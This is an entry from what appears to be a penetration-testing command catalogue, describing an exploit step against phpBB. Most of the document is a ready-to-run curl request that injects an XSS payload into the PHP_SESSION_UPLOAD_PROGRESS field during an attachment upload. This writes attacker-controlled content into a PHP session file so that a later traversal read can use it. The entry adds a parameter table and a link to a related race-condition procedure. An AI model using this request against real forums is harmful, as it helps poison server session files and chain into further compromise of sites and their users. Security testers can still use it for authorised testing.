---
data: >-
  curl -X POST "http://127.0.0.1/posting.php?mode=reply&t=1" -H "Host:
  127.0.0.1" -H "Content-Length: 108473" -H "Content-Type: multipart/form-data;
  boundary=----WebKitFormBoundaryOo7a3KoNwQen5oAC" --data-binary
  "------WebKitFormBoundaryOo7a3KoNwQen5oAC\nContent-Disposition: form-data;
  name=\"PHP_SESSION_UPLOAD_PROGRESS\"\n\n'\"onmouseover=alert()
  ><script>alert()</script>\"'\n...\nContent-Disposition: form-data;
  name=\"fileupload\"; filename=\"poc.zip\"\nContent-Type:
  application/x-zip-compressed\n\naaaaaaaa\n------WebKitFormBoundaryOo7a3KoNwQen5oAC--"
tags:
  - xss
  - upload
type: command
output: >-
  Creates /var/lib/php/sessions/sess_shin24 with payload, cleaned up after
  upload
executor: bash
platforms:
  - Linux
  - Web
id: 8733ca2b-bd2e-4096-8a6c-438130176890
created_at: '2025-12-14T17:26:49.102Z'
updated_at: '2025-12-14T17:26:49.102Z'
verified: false
validated: true
submitted: true
---
# phpbb-session-upload-xss-payload

## Command

```bash
curl -X POST "http://127.0.0.1/posting.php?mode=reply&t=1" -H "Host: 127.0.0.1" -H "Content-Length: 108473" -H "Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryOo7a3KoNwQen5oAC" --data-binary "------WebKitFormBoundaryOo7a3KoNwQen5oAC\nContent-Disposition: form-data; name=\"PHP_SESSION_UPLOAD_PROGRESS\"\n\n'\"onmouseover=alert() ><script>alert()</script>\"'\n...\nContent-Disposition: form-data; name=\"fileupload\"; filename=\"poc.zip\"\nContent-Type: application/x-zip-compressed\n\naaaaaaaa\n------WebKitFormBoundaryOo7a3KoNwQen5oAC--"
```

## Description

Uploads an attachment in phpBB while injecting XSS payload into PHP_SESSION_UPLOAD_PROGRESS, creating a session file with injectable content for later traversal read.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| PHPSESSID | Cookie for sess_ file naming, e.g., shin24 | Yes |
| PHP_SESSION_UPLOAD_PROGRESS | Malicious payload string | Yes |
| fileupload | Dummy file like poc.zip to trigger upload | Yes |

## Examples

### Basic Usage

```bash
curl ... # as above, with Cookie: PHPSESSID=shin24
```

### Advanced Usage

Adjust boundary and payload for variations.

## Expected Output

HTTP response for upload success; session file created temporarily.

## Related

- [[procedures/Exploit-PHP-Session-Upload-Progress-for-XSS-Race]]
